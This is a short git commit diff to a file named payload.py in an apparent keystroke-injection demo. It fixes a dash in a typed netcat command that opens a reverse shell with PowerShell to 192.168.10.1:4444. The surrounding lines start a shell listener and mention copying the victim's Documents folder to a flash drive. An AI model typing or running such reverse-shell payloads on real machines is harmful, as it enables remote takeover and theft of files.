5456ab3d3fe7421e68ef29cac2f3f74de72b82de
ThePraeceps <sunrob946@gmail.com>
2019-02-22 02:12:00 +0000

    Corrected dash

--- examples/demo/advanced/payload.py
+++ examples/demo/advanced/payload.py
@@ -55,7 +55,7 @@ def payload():
 
 	shelllistener=Process(target=reverse_shell_listener)
 	shelllistener.start()
-	eco.type("./nc.exe 192.168.10.1 4444 –e powershell.exe")
+	eco.type("./nc.exe 192.168.10.1 4444 -e powershell.exe")
 	shelllistener.join()
 	# Copy Documents Directory to Flash Drive
 	httpd.server_close()
